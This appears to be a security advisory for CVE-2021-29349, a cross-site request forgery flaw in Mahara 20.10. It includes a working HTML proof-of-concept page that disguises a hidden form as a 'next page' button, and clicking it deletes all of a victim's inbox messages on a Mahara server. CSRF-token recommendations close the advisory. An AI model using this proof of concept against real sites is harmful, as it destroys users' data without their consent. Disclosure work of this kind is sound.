| **Product** : Mahara 20.10  **Description**: Cross Site Request Forgery (CSRF) that allows a remote attacker to remove inbox-mail on the server. The application fails to validate the CSRF token for a POST request. An attacker can craft the /inbox.php directory, which leads to removing all messages from a mailbox.  **Video POC** : [Google Drive Video](https://drive.google.com/file/d/1bMQXuqDAJQHI7a91INfDD3ypJ7bG0Rk-/view?usp=sharing)  **POC** :  ``` /* Email Box Exploit - CSRF  */  <!DOCTYPE html> <html> <head> <meta name="viewport" content="width=device-width, initial-scale=1"> <style> body, html {   height: 100%;   margin: 0; }  .bg {   /* The image used */   background-image: url("https://avatars.githubusercontent.com/u/78818477?s=400&u=b18f9de63b3df28e6e1b4d2dc64303048aa5f5b5&v=4");    /* Full height */   height: 100%;     /* Center and scale the image nicely */   background-position: center;   background-repeat: no-repeat;   background-size: cover; } </style> </head> <body>  <div class="bg"></div>  <p>CSRF CVE-2021-29349 , After clicking below button all inbox maill messages will be deleted  !!.</p>  </body>  <form enctype="multipart/form-data" method="POST" action="https://demo.mahara.org/module/multirecipientnotification/inbox.php"><table><input type hidden="text" value="Delete+all+notifications" name="submit"> <input type hidden="text" value="all" name="type"> <input type hidden="text" value="L8T0C4WDuMxzakwV" name="sesskey"> <input type hidden="text" value="" name="pieform_delete_all_notifications"> </table><input type="submit" value="Click to View Next Page"></form> </html>  ```  **Recommendations** :  1- Implement `X-CSRF-TOKEN` and make sure it's validating in back-end server as well 2- Implement an interceptor which appends token value to every (state-changing) request in custom request header `X-XSRF-TOKEN-B` |
